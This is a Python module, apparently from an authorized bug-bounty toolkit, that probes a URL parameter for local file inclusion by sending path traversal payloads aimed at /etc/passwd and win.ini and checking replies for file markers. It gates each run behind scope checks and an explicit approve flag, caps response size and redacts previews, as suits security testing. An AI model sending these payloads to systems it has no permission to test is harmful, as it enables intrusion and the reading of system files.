"""Capped LFI / path traversal probe (authorized bounty only)."""

from __future__ import annotations

import json
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path
from typing import Any

from .. import ui
from ..redaction import redact_text
from .base import RunnerResult, require_in_scope

# Tiny non-destructive Linux/Windows markers
_PAYLOADS = (
    ("../../../../etc/passwd", ("root:x:", "daemon:", "bin/bash")),
    ("..\\..\\..\\windows\\win.ini", ("[fonts]", "[extensions]", "for 16-bit")),
    ("/etc/passwd", ("root:x:",)),
    ("....//....//....//etc/passwd", ("root:x:",)),
)


def lfi_probe(
    target_dir: Path,
    url: str,
    *,
    param: str = "file",
    approve: bool = False,
    force: bool = False,
    timeout: float = 12.0,
) -> RunnerResult:
    require_in_scope(target_dir, url, action="lfi path traversal probe", force=force)
    parsed = urllib.parse.urlparse(url if "://" in url else f"https://{url}")
    qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    plan = {"url": url, "param": param, "payloads": len(_PAYLOADS), "approve": approve}
    ui.code_panel(json.dumps(plan, indent=2), title="lfi_probe", lexer="json")
    cmd = ["lfi_probe", url, f"param={param}"]
    if not approve:
        ui.dry_run_banner()
        return RunnerResult(cmd, False, None, json.dumps({"dry_run": True, **plan}), "", "dry-run")

    results: list[dict[str, Any]] = []
    signal = False
    reason = "no LFI marker"
    for payload, markers in _PAYLOADS:
        qs2 = dict(qs)
        qs2[param] = [payload]
        probe = urllib.parse.urlunparse(
            (
                parsed.scheme,
                parsed.netloc,
                parsed.path,
                "",
                urllib.parse.urlencode({k: v[0] if v else "" for k, v in qs2.items()}),
                "",
            )
        )
        try:
            from ..scoped_http import scoped_fetch_bytes

            resp = scoped_fetch_bytes(
                probe,
                target_dir=target_dir,
                action="lfi path traversal probe",
                force=force,
                timeout=timeout,
                headers={"User-Agent": "hackbot-lfi-probe"},
                max_bytes=100_000,
                gate_initial=False,
            )
            status = resp.status
            body = resp.body.decode("utf-8", errors="replace")
        except Exception as exc:  # noqa: BLE001
            results.append({"payload": payload, "error": f"{type(exc).__name__}: {exc}"})
            continue
        hit = any(m.lower() in body.lower() for m in markers)
        results.append(
            {
                "payload": payload,
                "status": status,
                "marker": hit,
                "preview": redact_text(body[:180]),
            }
        )
        if hit:
            signal = True
            reason = f"LFI marker for payload {payload}"
            break

    payload = {"url": url, "param": param, "signal": signal, "reason": reason, "results": results}
    return RunnerResult(cmd, True, 0, json.dumps(payload), "", "executed")
